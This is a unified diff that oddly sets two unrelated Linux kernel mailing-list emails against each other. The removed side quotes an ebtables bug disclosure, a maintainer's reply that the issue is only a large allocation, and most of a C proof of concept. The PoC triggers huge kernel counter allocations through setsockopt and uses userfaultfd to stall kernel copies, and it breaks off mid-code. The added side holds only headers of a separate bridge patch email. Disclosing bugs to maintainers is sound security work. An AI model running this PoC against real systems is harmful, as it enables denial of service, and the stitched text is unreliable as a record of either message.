@@ -1,831 +1,143 @@
-Received: from mail-lj1-f173.google.com (mail-lj1-f173.google.com [209.85.208.173])
+Received: from mail-yw1-f177.google.com (mail-yw1-f177.google.com [209.85.128.177])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id AAFB817A30A
-	for <bridge@lists.linux.dev>; Wed, 29 Jul 2026 04:44:50 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.208.173
-ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1785300293; cv=pass; b=AkyG+C3TW19YHpLl2WOT71IL2SFLaBhL5cnNtCsop34jgBRXupQ1dsksDX/XcHSALeGeFRIeupUlICTT3fh0aX6eLtRK/cB/U4NFXqNVUT2n/bWyrOhaUieGnpJ/+0nJ32L/RWnQN2i/88GJFe34MJxUKqniVH4XkJ4v3/AqKDE=
-ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1785300293; c=relaxed/simple;
-	bh=DvzldrV41tM5vRJP3ooWinc8ixudGeEhGlrv0/BI0f4=;
-	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
-	 To:Cc:Content-Type; b=K0o4DB87NBjkFR6Lh+2v07f6Rq7b9ImkS4rU2cLKPWaZnnLF5NVKWUZvlZiSVMDgzK3eutt+1GfgxTOZ2jdCR6xgCJjCy738O/vtWKj3a54XimhGaE7qBq9+qxx8+wiUTlzm+78ufPgLtT0+KzfjvPRte9POB30x11q0kvHgYHk=
-ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=dSqT3Z/3; arc=pass smtp.client-ip=209.85.208.173
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D1A8048A8BD
+	for <bridge@lists.linux.dev>; Wed, 29 Jul 2026 13:19:51 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.128.177
+ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
+	t=1785331195; cv=none; b=ctzGJ2BU/gJ3nPsaKm9ksbRLgsrm7flt5rPfgZI91Vdeg4mB4gEAKDLhjJVmHUIf9vWtDj2JChtgzBW+Z7rtJEQK2kR+Y6h3FPgDVy2dRWScSxo4g4v559eoqxcyiGJN/veOlk6V8MH7WGKuuObRg0ROxnmPxqVqT06DUPei1CY=
+ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
+	s=arc-20240116; t=1785331195; c=relaxed/simple;
+	bh=kdlhdT6qgk713ttnMT/RjwDbI68wlDahWZC3PMz1mLk=;
+	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
+	 MIME-Version; b=quBmO2dxGBJQbkb3IzBxh0QW2y9aGCHfbnlqiTDPKUNp0yEwVdjiLoPZhSnpjYVaBEaRSJIbpGx81M/75zL3Ao6UsDNO6XpEmtJ2Y164TOMcTcgETSkvQuIVTWo8w8RV8DqI6tB9zOkklybszmepCcFLZaEYAI3FZiPTt1YihCw=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=xbow.com; spf=pass smtp.mailfrom=xbow.com; dkim=pass (2048-bit key) header.d=xbow.com header.i=@xbow.com header.b=HT1Z4mKj; arc=none smtp.client-ip=209.85.128.177
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=xbow.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=xbow.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="dSqT3Z/3"
-Received: by mail-lj1-f173.google.com with SMTP id 38308e7fff4ca-39c908d6cb6so4236321fa.1
-        for <bridge@lists.linux.dev>; Tue, 28 Jul 2026 21:44:50 -0700 (PDT)
-ARC-Seal: i=1; a=rsa-sha256; t=1785300289; cv=none;
-        d=google.com; s=arc-20260327;
-        b=BQnCwcmiV8ge4YmidZwT4lvJvth1/d3LnwcjuBUT+Y3ictYYCdbLEX2GTS3IrmHo6Q
-         lLZDin+2Z7uHyuDzl89Adlya5NZYz90XWCd3F/3GU1VNgHOmJT4uYkOdzIjNn7pq2Rtw
-         bsF7Y04g5KKLg84SIEDVoMSxJDMYLhh8CkKg6kDMD20P1zIodo1h9Ixpr5D0ZUDxrH1q
-         VxE7kJYxhFKhO0SemWsUpNIZvoMotnRbfBUO8V6SwhddBs+7lBB/6eoW/7z/xrxksWE3
-         pAgYlzZ1qHiqM3QR/yelBjQA3bO4syJ7zU3ehjfGot448+t5iogFlCGgKrFYoSa0BACb
-         bmVg==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
-        h=content-transfer-encoding:cc:to:subject:message-id:date:from
-         :in-reply-to:references:mime-version:dkim-signature;
-        bh=PkVGIRIwAWV2OMKIaDQZJVlGPRS3RuzgiV56nbJx0I0=;
-        fh=SXIy27kNQMp+it1jbHNvHgE4OYfzgfo2dnn5odcEV8I=;
-        b=Q138ZIVLKBDESARhP4WoHvU4SbPt02SSTLHlOC94wEyXGkcVWaDPBRVvJxA7FxUjEG
-         x6mxVJT1EDbvOAToHaVJEi4DGN4cKV0/CWHS/SQTTRubKTujMNcVBJrbmftjCtOdyGSp
-         60tCcF03LP2kLrzeLLa0meZOCZLHopfJpsqwy/imlmhyuZxeQA+IEE9ws7UYDHChuGtk
-         UDG7g1/MRyezoAHqnscAYPdGRvhXB2GPRVOlHws3MZv0+mnAFHn7aSOdf2ttZiOIM5hE
-         6zOXsBZGpsECV0ZfxSuUDF9wszqHuH88w53SGbt9yImpnDlELV6VqFg37FHCHdQ5zf0V
-         sWRQ==;
-        darn=lists.linux.dev
-ARC-Authentication-Results: i=1; mx.google.com; arc=none
+	dkim=pass (2048-bit key) header.d=xbow.com header.i=@xbow.com header.b="HT1Z4mKj"
+Received: by mail-yw1-f177.google.com with SMTP id 00721157ae682-81f3b227a4aso15156537b3.1
+        for <bridge@lists.linux.dev>; Wed, 29 Jul 2026 06:19:51 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=nebusec.ai; s=google; t=1785300289; x=1785905089; darn=lists.linux.dev;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:from:to:cc:subject
-         :date:message-id:reply-to:content-type;
-        bh=PkVGIRIwAWV2OMKIaDQZJVlGPRS3RuzgiV56nbJx0I0=;
-        b=dSqT3Z/3EMBrrx3ff4BcZxYcePLrIzj1vIoifunFETWbvlmPDbRI3Q56k9TqZJH3vB
-         f+9xqbgvPmpcyH+rNC36OOjdMAwFtGtqR5X1StrvstcqYzgMjjGi5gcsY3rqWxjc/LuZ
-         a4Pm9PrYr8xoW9cmvIeNpp4I8KYSaSuAOrXsFgq2RCIpQjIH4VuktX2B8RCfRnwUcOFe
-         HpBMiE9D7xA0e5LoQ9jxo6xWwfhQZTvIyPfIpbGP6C/rH3xFw1JdLlYkAs+WcNZo5HOi
-         ghHnnrWMbnVorBhh6ty+ZDZzzi2BVUSzA66trGRrLwa1a4knprdKrzgKsplnc0dI9Et4
-         87aQ==
+        d=xbow.com; s=google; t=1785331191; x=1785935991; darn=lists.linux.dev;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=KMXrirPZU7fXTxWoE1e8bDQ+DkmRVCXCwha59Dx6pk0=;
+        b=HT1Z4mKjyYvjtVVs2S8tT7hd4+OU11R9QXBJN0ZfZnHpuBcDuOSUBOdIqucLoDUZP9
+         fqadIbcQlCoONorGomYs1YFJHI5D16C2GPs12LQXOk1v2L4pmMiTwebcDxe0S+04VQ3/
+         w8ul4nC5ph9X+gCi2ecEe0z8ptG1WjePLrfn4lRMJ0wjsioeWqX1LCTQB8QI/OlfAXdg
+         7Hnfu09mJX9DR5xSnypyK5B3fh54b6HaiXniNao9N4nxtUlLp0DNQhQY/1rzPYKb5A1f
+         vk1qGsBvO4UVsQTbRHR+lPvoSIHA0cg1RBA8Dnxzp5p0vHlICoZMID6/l3BEfeXvllXv
+         QwVQ==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1785300289; x=1785905089;
-        h=content-transfer-encoding:content-type:cc:to:subject:message-id
-         :date:from:in-reply-to:references:mime-version:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=PkVGIRIwAWV2OMKIaDQZJVlGPRS3RuzgiV56nbJx0I0=;
-        b=jgdUqcQ75KYIoKMctjfjv2mtkd756c+YQRj7sJstKEU1soDXwW+B5tKe76US+JQTQS
-         H6HPSO65oig+/WDTv+MpHDpj4nvVEz2rykdqp18B172gdgWym+bfizat+5g2Otk3HEAC
-         yqZ8M5MpsyZlocdPwVX89SV7ipoMjUTHigljtabtvnu6KXDPXpmy79O8xm59M4LSR63K
-         CkJ2Ye6ddIpKlzL/a1Fw6rQ0mhZ5LQpE3ThCF8nlGvytVGazWfjpxcO/zn9LeNswBQd2
-         PSNL2ZCZS2gMWlhTOvwYVUkMXlbLmK9yn6YNz2aA/GZykn/kSdFMMQO0lftDt7/GazOw
-         mC5A==
-X-Forwarded-Encrypted: i=1; AHgh+Ro9lQs+GllVlxQ9fvUvkvECIv9dYere4RislwyP1Z0hoc0BzcTnKuMvUaJ5at/mfEgKQwaF18U=@lists.linux.dev
-X-Gm-Message-State: AOJu0YyPinMV74Bgf6ullNF0S3Jz9CKlTcHF7zDL6IdXMLz4DzafWFRJ
-	hNW2f7FTQX9kkve5TDsePjyMoLJNRygwF710AQVFV1E1ZzDmXW/fHcFcqnf6FkT/pR9dQknQ1iD
-	zd+CCa6bk2fkLKXd1NW1GPYKiCTrjUj5Y+OZ9/lWs7Pc=
-X-Gm-Gg: AR+sD11oHuksZ4vNxH0OkjoEXZjCFPCW4F19lgiQK8/Xqj+ROg/ROsIbv14+jxHzOdS
-	3KUAK12w/T6TmD/KyZAQCIP4UK1wK34i6G3lN9Y36yb9WJewyRD58s0fHWyt+rEb1kBh3xqJgFK
-	t9KfX5+KCHv/LNgP4l4GPQUPJ++YEpqIepgXo73ivP7kiEXk5ZCOQuRrRsAYxspLTXUku0ulpa3
-	fWACchOQTFfbwIlM1rgTqpsVO1uq7uU3wV380rumIENAM6dhm/iADMWc7r5GUGrqa0aZlKadETO
-	Uu6lqdD8v5fOZNJg2HV42BYkacoy7MVKr37K17U8Vrc=
-X-Received: by 2002:a2e:bc1d:0:b0:39b:d04:b778 with SMTP id
- 38308e7fff4ca-39f51cdefd1mr9403741fa.5.1785300288185; Tue, 28 Jul 2026
- 21:44:48 -0700 (PDT)
+        d=1e100.net; s=20251104; t=1785331191; x=1785935991;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to:content-type;
+        bh=KMXrirPZU7fXTxWoE1e8bDQ+DkmRVCXCwha59Dx6pk0=;
+        b=IBemoWQy44aqTnbgL7BVPlhiOTb/987zFqbQSdEe5NP2sVJAtBLQuxjRxyL7/X0DKb
+         bcSF2rf7Py3p+N8HU1q1TsdtME/UEm976VweaugtTlFr553ygeQCH0skyIj4Stbt8/Qo
+         6b5bWSurs9xcx/1Zv+Y03D77mtDtGj7Im34WpgnXrRGYBfHAdpVIDjzJVxv7FimWHzwF
+         uctF8gu1e702+UQ+lSFVfcnkHw4qMxhEACSB1UIkKabCv1/lUzZ7FJQZz9bN/F10F6cd
+         buIemwbVyXUPTx738xb6qnrhCZ1qkzluMZ/dIfL2nB09Uf2efj8RIk6Ywgmzuo/dBAwp
+         LpLg==
+X-Forwarded-Encrypted: i=1; AHgh+RrBikCDEA14iCQ7b5rX4unR1ZLyBWm8LPjc/pL+2n+NGjR7dRxyBRvAgeLdfkwwEPq+k9DCJ6s=@lists.linux.dev
+X-Gm-Message-State: AOJu0Yy+ZXBNuforgIIV5p4/rmgh4U2UutLAd+QkTsUm4QsZYpyix+sL
+	Qs90Polf7Sdp81dQ/F/+YGhBZCxr3f5nqJcTtRxqDIpasZSs1Ll5jtZkXoqo8d08GyQ=
+X-Gm-Gg: AR+sD13Wak7EQ+d54OUb5p59ELTUTiaIZ62rG5UgIdBJt04nV9KbF0JQrWAn92PX0la
+	T55BB8HP3iMEWa67C+F83MR+KfdHrNsqo4BAm8BI0vCUvT20iLKHo6pTM2eFUz9N7AWPdNVa6Xh
+	XiRriJBFoQC3/JpDUm8k+iiPhSuV+oBfMfk3TLHCgGJsF26EKZ1twP6SQ/zzSyo8jyvanijSmUx
+	NkN/uw2DwrVPPRlXk9cNa+9CjT9wb2yQCgm2glDZCFjkLymm5WFoa1QWM2pSf/r+07UBHk2A0nR
+	Yt8Lt08QUMhtRzx42DTwVye2ak2j/9wDl+iaHCQtERDZWiAk7KhXB6XGI64XfiB8qgp5jXJzus+
+	7mTA9AFSXV9fVWDz9eLq8rca6cY8+iTIoO1S8vT9ooXlbJC3fjs67VN1jy0kYfo9mWMlgpT+vno
+	L7JQJ4zYZ9TsZc9YtuKjTzRVHf8ZZB5WFW08IE24d2RoJQVrx4EMO79OcFFvO8f7kMq4jC5+oEd
+	FKg7cKYwJt2Ee6F2E5SufI7WhBMGy0xIIlB3yx/js2KlkKzaDOCrt1qLQMgp8/2FobZPlqSPUKf
+	y87HG9T+BSWruUb7MpgNk4UIYQi3Qg==
+X-Received: by 2002:a05:690c:62c7:b0:814:5312:47bb with SMTP id 00721157ae682-81f993f145fmr33494437b3.69.1785331190331;
+        Wed, 29 Jul 2026 06:19:50 -0700 (PDT)
+Received: from buildmachine.tailf331da.ts.net (ec2-3-14-143-233.us-east-2.compute.amazonaws.com. [3.14.143.233])
+        by smtp.gmail.com with ESMTPSA id 00721157ae682-81fa275691asm17653907b3.4.2026.07.29.06.19.45
+        (version=TLS1_3 cipher=TLS_CHACHA20_POLY1305_SHA256 bits=256/256);
+        Wed, 29 Jul 2026 06:19:50 -0700 (PDT)
+From: Baul Lee <baul.lee@xbow.com>
+To: netdev@vger.kernel.org,
+	bridge@lists.linux.dev,
+	linux-kernel@vger.kernel.org
+Cc: Nikolay Aleksandrov <razor@blackwall.org>,
+	Ido Schimmel <idosch@nvidia.com>,
+	Andrew Lunn <andrew@lunn.ch>,
+	"David S . Miller" <davem@davemloft.net>,
+	Eric Dumazet <edumazet@google.com>,
+	Jakub Kicinski <kuba@kernel.org>,
+	Paolo Abeni <pabeni@redhat.com>,
+	Simon Horman <horms@kernel.org>,
+	stable@vger.kernel.org,
+	Baul Lee <baul.lee@xbow.com>
+Subject: [PATCH net v2] net: bridge: mrp: fix uninitialised bytes on the wire
+Date: Wed, 29 Jul 2026 22:19:41 +0900
+Message-ID: <20260729131941.10254-1-baul.lee@xbow.com>
+X-Mailer: git-send-email 2.50.1
+In-Reply-To: <20260726062518.43774-1-baul.lee@xbow.com>
+References: <20260726062518.43774-1-baul.lee@xbow.com>
 Precedence: bulk
 X-Mailing-List: bridge@lists.linux.dev
 List-Id: <bridge.lists.linux.dev>
 List-Subscribe: <mailto:bridge+subscribe@lists.linux.dev>
 List-Unsubscribe: <mailto:bridge+unsubscribe@lists.linux.dev>
 MIME-Version: 1.0
-References: <cover.1785131981.git.zihanx@nebusec.ai> <amkEmMRrTkx3YU1t@chamomile>
-In-Reply-To: <amkEmMRrTkx3YU1t@chamomile>
-From: zihan xi <zihanx@nebusec.ai>
-Date: Wed, 29 Jul 2026 12:44:37 +0800
-X-Gm-Features: AUfX_mzvl1J7PkbSX7eip61CAFMkY9XQHOJdVEKZeiYscXReT-N5upk6iDSV4K8
-Message-ID: <CAANe3eQgQ1cELKRhFmnu46JN-CzWJo_JwiqZ4apeRNo6vvj3Lw@mail.gmail.com>
-Subject: Re: [PATCH nf 0/1] netfilter: ebtables: avoid unbounded counter allocations
-To: Pablo Neira Ayuso <pablo@netfilter.org>
-Cc: Ren Wei <enjou1224z@gmail.com>, netfilter-devel@vger.kernel.org, 
-	bridge@lists.linux.dev, fw@strlen.de, phil@nwl.cc, razor@blackwall.org, 
-	idosch@nvidia.com, vega@nebusec.ai
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+Content-Transfer-Encoding: 8bit
 
-On Wed, Jul 29, 2026 at 3:35=E2=80=AFAM Pablo Neira Ayuso <pablo@netfilter.=
-org> wrote:
->
-> Hi,
->
-> On Tue, Jul 28, 2026 at 02:09:43AM +0800, Ren Wei wrote:
-> > From: Zihan Xi <zihanx@nebusec.ai>
-> >
-> > Hi Linux kernel maintainers,
-> >
-> > We found and validated a issue in net/bridge/netfilter/ebtables.c. The =
-bug is reachable by a
-> > non-root user via user and net namespace.
-> > We've tested it, and it should not affect any other functionality.
-> >
-> > We will provide detailed information about the bug
-> > in this email, along with a PoC to trigger it.
-> >
-> > ---- details below ----
-> >
-> > Bug details:
-> >
-> > EBT_SO_SET_COUNTERS copies only a fixed struct ebt_replace header befor=
-e it
-> > allocates a temporary counter array. The user-controlled num_counters f=
-ield is
-> > used for that allocation before the target table is looked up and befor=
-e it can
-> > be compared with the table's real nentries value. A user with CAP_NET_A=
-DMIN in
-> > a user/net namespace can therefore request a very large allocation agai=
-nst any
-> > table name, even a non-existent one.
->
-> You could just create a very large well-formed table with ebtables too?
->
-> This is not a crash, just a very large allocation.
->
-> [    1.577403] poc: vmalloc error: size 2147483520, exceeds total pages, =
-mode:0xcc0(GFP_KERNEL), nodemask=3D(null),cpuset=3D/,mems_allowed=3D0
->
-> > EBT_SO_SET_ENTRIES has the same root cause in do_replace_finish(). Afte=
-r the
-> > replacement blob is copied and validated, do_replace_finish() used
-> > repl->num_counters to allocate counterstmp before find_table_lock() and=
- before
-> > checking it against t->private->nentries. That path can trigger the sam=
-e
-> > unbounded allocation before the kernel knows whether the table exists o=
-r how
-> > many counters are valid for it.
-> >
-> > Recent public patches on July 2, 2026 and July 4, 2026 also tightened
-> > bounds for do_replace()/do_replace_finish() and do_update_counters()
-> > individually, but the underlying issue is the same in both paths:
-> > temporary counter arrays are allocated from user-controlled counts befo=
-re
-> > the kernel has resolved the real table and validated the real nentries
-> > value.
-> >
-> > Fix this by moving both temporary counter allocations after find_table_=
-lock()
-> > and after the num_counters-to-nentries validation. Invalid table names =
-or
-> > counter counts now fail with the existing semantic errors instead of fi=
-rst
-> > attempting a large allocation. This is a setsockopt control-plane trigg=
-er, not
-> > a packet-driven protocol-state trigger, so packetdrill cannot express t=
-he key
-> > EBT_SO_SET_COUNTERS/EBT_SO_SET_ENTRIES inputs; the reproducer uses sets=
-ockopt()
-> > directly.
-> >
-> > Reproducer:
-> >
-> >     gcc -O2 -static -o poc poc.c
-> >     unshare -Urn ./poc
-> >
-> > We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
-> >
-> > ------BEGIN poc.c------
-> > #define _GNU_SOURCE
-> >
-> > #include <errno.h>
-> > #include <fcntl.h>
-> > #include <inttypes.h>
-> > #include <poll.h>
-> > #include <pthread.h>
-> > #include <signal.h>
-> > #include <stdbool.h>
-> > #include <stdint.h>
-> > #include <stdio.h>
-> > #include <stdlib.h>
-> > #include <string.h>
-> > #include <sys/ioctl.h>
-> > #include <sys/mman.h>
-> > #include <sys/socket.h>
-> > #include <sys/syscall.h>
-> > #include <sys/types.h>
-> > #include <sys/wait.h>
-> > #include <unistd.h>
-> >
-> > #include <linux/userfaultfd.h>
-> >
-> > #ifndef O_CLOEXEC
-> > #define O_CLOEXEC 02000000
-> > #endif
-> >
-> > #define SOL_IP 0
-> >
-> > #define EBT_TABLE_MAXNAMELEN 32
-> > #define EBT_BASE_CTL 128
-> > #define EBT_SO_SET_ENTRIES (EBT_BASE_CTL)
-> > #define EBT_SO_SET_COUNTERS (EBT_SO_SET_ENTRIES + 1)
-> > #define EBT_SO_GET_INFO (EBT_BASE_CTL)
-> > #define EBT_SO_GET_ENTRIES (EBT_SO_GET_INFO + 1)
-> >
-> > #define NF_BR_NUMHOOKS 6
-> >
-> > struct ebt_counter {
-> >       uint64_t pcnt;
-> >       uint64_t bcnt;
-> > };
-> >
-> > struct ebt_replace {
-> >       char name[EBT_TABLE_MAXNAMELEN];
-> >       unsigned int valid_hooks;
-> >       unsigned int nentries;
-> >       unsigned int entries_size;
-> >       void *hook_entry[NF_BR_NUMHOOKS];
-> >       unsigned int num_counters;
-> >       struct ebt_counter *counters;
-> >       char *entries;
-> > };
-> >
-> > #define HUGE_NUM_COUNTERS 134217720U
-> > #define HUGE_COUNTERS_LEN ((unsigned int)(sizeof(struct ebt_replace) + =
-\
-> >                                         HUGE_NUM_COUNTERS * sizeof(stru=
-ct ebt_counter)))
-> > #define TINY_ENTRIES_SIZE 1U
-> > #define HUGE_REPLACE_LEN ((unsigned int)(sizeof(struct ebt_replace) + \
-> >                                        TINY_ENTRIES_SIZE))
-> >
-> > _Static_assert(sizeof(struct ebt_replace) =3D=3D 120, "unexpected ebt_r=
-eplace size");
-> > _Static_assert(HUGE_COUNTERS_LEN =3D=3D 2147483640U,
-> >              "unexpected huge setsockopt length");
-> >
-> > struct table_info {
-> >       unsigned int nentries;
-> >       unsigned int entries_size;
-> >       unsigned int valid_hooks;
-> > };
-> >
-> > struct blocker_state {
-> >       int uffd;
-> >       long page_size;
-> >       void *fault_page;
-> >       char *copy_page;
-> >       volatile sig_atomic_t release_fault;
-> >       volatile sig_atomic_t fault_seen;
-> >       volatile sig_atomic_t blocker_started;
-> >       struct ebt_replace *req;
-> >       socklen_t optlen;
-> >       int blocker_ret;
-> >       int blocker_errno;
-> > };
-> >
-> > static void fatal(const char *what)
-> > {
-> >       perror(what);
-> >       exit(EXIT_FAILURE);
-> > }
-> >
-> > static int make_inet_socket(void)
-> > {
-> >       int fd =3D socket(AF_INET, SOCK_STREAM, 0);
-> >
-> >       if (fd < 0)
-> >               fatal("socket(AF_INET, SOCK_STREAM)");
-> >       return fd;
-> > }
-> >
-> > static void get_table_info(const char *name, struct table_info *info)
-> > {
-> >       struct ebt_replace req;
-> >       socklen_t len =3D sizeof(req);
-> >       int fd =3D make_inet_socket();
-> >
-> >       memset(&req, 0, sizeof(req));
-> >       snprintf(req.name, sizeof(req.name), "%s", name);
-> >
-> >       if (getsockopt(fd, SOL_IP, EBT_SO_GET_INFO, &req, &len) !=3D 0)
-> >               fatal("getsockopt(EBT_SO_GET_INFO)");
-> >
-> >       close(fd);
-> >
-> >       info->nentries =3D req.nentries;
-> >       info->entries_size =3D req.entries_size;
-> >       info->valid_hooks =3D req.valid_hooks;
-> > }
-> >
-> > static int do_huge_update(const char *name, bool log_result)
-> > {
-> >       struct ebt_replace req;
-> >       int fd =3D make_inet_socket();
-> >       int saved_errno;
-> >       int ret;
-> >
-> >       memset(&req, 0, sizeof(req));
-> >       snprintf(req.name, sizeof(req.name), "%s", name);
-> >       req.num_counters =3D HUGE_NUM_COUNTERS;
-> >       req.counters =3D (struct ebt_counter *)0x10000;
-> >
-> >       errno =3D 0;
-> >       ret =3D setsockopt(fd, SOL_IP, EBT_SO_SET_COUNTERS, &req,
-> >                        HUGE_COUNTERS_LEN);
-> >       saved_errno =3D errno;
-> >       close(fd);
-> >
-> >       if (log_result)
-> >               fprintf(stderr,
-> >                       "[worker] SET_COUNTERS name=3D%s len=3D%u num_cou=
-nters=3D%u -> ret=3D%d errno=3D%d (%s)\n",
-> >                       name, HUGE_COUNTERS_LEN, HUGE_NUM_COUNTERS, ret,
-> >                       saved_errno, strerror(saved_errno));
-> >
-> >       errno =3D saved_errno;
-> >       return ret;
-> > }
-> >
-> > static int do_huge_replace(const char *name, bool log_result)
-> > {
-> >       struct ebt_replace req;
-> >       char tiny_entries[TINY_ENTRIES_SIZE] =3D {0};
-> >       int fd =3D make_inet_socket();
-> >       int saved_errno;
-> >       int ret;
-> >
-> >       memset(&req, 0, sizeof(req));
-> >       snprintf(req.name, sizeof(req.name), "%s", name);
-> >       req.entries_size =3D TINY_ENTRIES_SIZE;
-> >       req.entries =3D tiny_entries;
-> >       req.num_counters =3D HUGE_NUM_COUNTERS;
-> >       req.counters =3D (struct ebt_counter *)0x10000;
-> >
-> >       errno =3D 0;
-> >       ret =3D setsockopt(fd, SOL_IP, EBT_SO_SET_ENTRIES, &req,
-> >                        HUGE_REPLACE_LEN);
-> >       saved_errno =3D errno;
-> >       close(fd);
-> >
-> >       if (log_result)
-> >               fprintf(stderr,
-> >                       "[worker] SET_ENTRIES name=3D%s len=3D%u entries_=
-size=3D%u num_counters=3D%u allocation=3D%zu -> ret=3D%d errno=3D%d (%s)\n"=
-,
-> >                       name, HUGE_REPLACE_LEN, TINY_ENTRIES_SIZE,
-> >                       HUGE_NUM_COUNTERS,
-> >                       (size_t)HUGE_NUM_COUNTERS * sizeof(struct ebt_cou=
-nter),
-> >                       ret, saved_errno, strerror(saved_errno));
-> >
-> >       errno =3D saved_errno;
-> >       return ret;
-> > }
-> >
-> > static int open_userfaultfd(void)
-> > {
-> >       struct uffdio_api api;
-> >       int fd;
-> >
-> >       fd =3D syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
-> >       if (fd < 0) {
-> >               fd =3D open("/dev/userfaultfd", O_RDWR | O_CLOEXEC | O_NO=
-NBLOCK);
-> >               if (fd < 0)
-> >                       fatal("userfaultfd/open(/dev/userfaultfd)");
-> >               fd =3D ioctl(fd, USERFAULTFD_IOC_NEW, O_CLOEXEC | O_NONBL=
-OCK);
-> >               if (fd < 0)
-> >                       fatal("USERFAULTFD_IOC_NEW");
-> >       }
-> >
-> >       memset(&api, 0, sizeof(api));
-> >       api.api =3D UFFD_API;
-> >       if (ioctl(fd, UFFDIO_API, &api) < 0)
-> >               fatal("UFFDIO_API");
-> >
-> >       return fd;
-> > }
-> >
-> > static void register_missing_page(struct blocker_state *st)
-> > {
-> >       struct uffdio_register reg;
-> >
-> >       st->fault_page =3D mmap(NULL, st->page_size, PROT_READ | PROT_WRI=
-TE,
-> >                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-> >       if (st->fault_page =3D=3D MAP_FAILED)
-> >               fatal("mmap(fault_page)");
-> >       if (munmap(st->fault_page, st->page_size) !=3D 0)
-> >               fatal("munmap(fault_page)");
-> >
-> >       st->copy_page =3D calloc(1, (size_t)st->page_size);
-> >       if (!st->copy_page)
-> >               fatal("calloc(copy_page)");
-> >
-> >       memset(&reg, 0, sizeof(reg));
-> >       reg.range.start =3D (unsigned long)st->fault_page;
-> >       reg.range.len =3D (unsigned long)st->page_size;
-> >       reg.mode =3D UFFDIO_REGISTER_MODE_MISSING;
-> >       if (ioctl(st->uffd, UFFDIO_REGISTER, &reg) !=3D 0)
-> >               fatal("UFFDIO_REGISTER");
-> > }
-> >
-> > static void *uffd_handler_thread(void *arg)
-> > {
-> >       struct blocker_state *st =3D arg;
-> >
-> >       while (!st->release_fault) {
-> >               struct uffd_msg msg;
-> >               struct pollfd pfd =3D { .fd =3D st->uffd, .events =3D POL=
-LIN };
-> >               int pr =3D poll(&pfd, 1, 100);
-> >
-> >               if (pr < 0) {
-> >                       if (errno =3D=3D EINTR)
-> >                               continue;
-> >                       fatal("poll(userfaultfd)");
-> >               }
-> >               if (pr =3D=3D 0)
-> >                       continue;
-> >               if (read(st->uffd, &msg, sizeof(msg)) !=3D sizeof(msg))
-> >                       fatal("read(userfaultfd)");
-> >               if (msg.event !=3D UFFD_EVENT_PAGEFAULT)
-> >                       continue;
-> >
-> >               st->fault_seen =3D 1;
-> >               fprintf(stderr,
-> >                       "[blocker] userfaultfd trapped kernel copy_to_use=
-r at address 0x%llx\n",
-> >                       (unsigned long long)msg.arg.pagefault.address);
-> >
-> >               while (!st->release_fault)
-> >                       usleep(10000);
-> >
-> >               struct uffdio_copy copy;
-> >               memset(&copy, 0, sizeof(copy));
-> >               copy.src =3D (unsigned long)st->copy_page;
-> >               copy.dst =3D (unsigned long)st->fault_page;
-> >               copy.len =3D (unsigned long)st->page_size;
-> >               if (ioctl(st->uffd, UFFDIO_COPY, &copy) !=3D 0)
-> >                       fatal("UFFDIO_COPY");
-> >               fprintf(stderr, "[blocker] released the trapped GET_ENTRI=
-ES fault\n");
-> >               break;
-> >       }
-> >
-> >       return NULL;
-> > }
-> >
-> > static void *blocker_thread(void *arg)
-> > {
-> >       struct blocker_state *st =3D arg;
-> >       int fd =3D make_inet_socket();
-> >
-> >       st->blocker_started =3D 1;
-> >       errno =3D 0;
-> >       st->blocker_ret =3D getsockopt(fd, SOL_IP, EBT_SO_GET_ENTRIES,
-> >                                      st->req, &st->optlen);
-> >       st->blocker_errno =3D errno;
-> >       fprintf(stderr,
-> >               "[blocker] getsockopt(EBT_SO_GET_ENTRIES) returned ret=3D=
-%d errno=3D%d (%s)\n",
-> >               st->blocker_ret, st->blocker_errno, strerror(st->blocker_=
-errno));
-> >       close(fd);
-> >       return NULL;
-> > }
-> >
-> > static uint64_t read_meminfo_kb(const char *key)
-> > {
-> >       char name[128];
